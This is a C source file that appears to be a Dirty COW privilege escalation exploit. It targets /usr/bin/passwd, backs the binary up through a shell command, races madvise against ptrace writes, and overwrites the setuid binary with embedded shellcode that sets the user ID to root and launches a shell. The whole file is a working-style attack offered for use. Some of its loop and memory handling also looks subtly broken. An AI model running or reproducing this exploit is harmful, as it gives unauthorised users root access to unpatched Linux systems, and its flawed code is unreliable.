#define _GNU_SOURCE
#include <sys/mman.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ptrace.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <pthread.h>

void backupSuidBinary(const char *suid_binary) {
    char backup_cmd[256];
    sprintf(backup_cmd, "cp %s /tmp/bak", suid_binary);
    system(backup_cmd);
}

void *madviseThread(void *arg) {
    void *map = arg;
    int i, c = 0;
    for (i = 0; i < 200000000; i++)
        c += madvise(map, 100, MADV_DONTNEED);
    printf("madvise %d\n\n", c);
}

void patchSuidBinary(pid_t pid, void *map, const unsigned char *shellcode, size_t length) {
    int i, c = 0;
    size_t l = length;
    for (i = 0; i < 10000 / l; i++) {
        for (size_t o = 0; o < l; o++) {
            for (int u = 0; u < 10000; u++) {
                c += ptrace(PTRACE_POKETEXT, pid, map + o, *((long *)(shellcode + o)));
            }
        }
    }
    printf("ptrace %d\n\n", c);
}

void escalatePrivileges(const char *suid_binary, const unsigned char *shellcode, size_t length) {
    int f = open(suid_binary, O_RDONLY);
    if (f == -1) {
        perror("Failed to open suid binary");
        exit(1);
    }

    struct stat st;
    if (fstat(f, &st) == -1) {
        perror("Failed to get file information");
        exit(1);
    }

    void *map = mmap(NULL, st.st_size + sizeof(long), PROT_READ, MAP_PRIVATE, f, 0);
    if (map == MAP_FAILED) {
        perror("Failed to map file into memory");
        exit(1);
    }

    printf("DirtyCow root privilege escalation\n");
    printf("Backing up %s to /tmp/bak\n", suid_binary);
    backupSuidBinary(suid_binary);

    pid_t pid = fork();
    if (pid == -1) {
        perror("Failed to fork");
        exit(1);
    }

    if (pid == 0) {
        // Child process
        pthread_t pth;
        pthread_create(&pth, NULL, madviseThread, map);
        ptrace(PTRACE_TRACEME);
        kill(getpid(), SIGSTOP);
        pthread_join(pth, NULL);
    } else {
        // Parent process
        waitpid(pid, NULL, 0);
        patchSuidBinary(pid, map, shellcode, length);
    }

    munmap(map, st.st_size + sizeof(long));
    close(f);
}

int main() {
    const char *suid_binary = "/usr/bin/passwd";
    unsigned char shellcode[] = {
        // Replace this with your actual shellcode
        0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x3e, 0x00, 0x01, 0x00, 0x00, 0x00,
        0x78, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38, 0x00, 0x01, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,
        0xb1, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xea, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x48, 0x31, 0xff, 0x6a, 0x69, 0x58, 0x0f, 0x05, 0x6a, 0x3b, 0x58, 0x99,
        0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, 0x53, 0x48,
        0x89, 0xe7, 0x68, 0x2d, 0x63, 0x00, 0x00, 0x48, 0x89, 0xe6, 0x52, 0xe8,
        0x0a, 0x00, 0x00, 0x00, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x62, 0x61, 0x73,
        0x68, 0x00, 0x56, 0x57, 0x48, 0x89, 0xe6, 0x0f, 0x05
    };
    unsigned int sc_len = 177;

    escalatePrivileges(suid_binary, shellcode, sc_len);

    return 0;
}
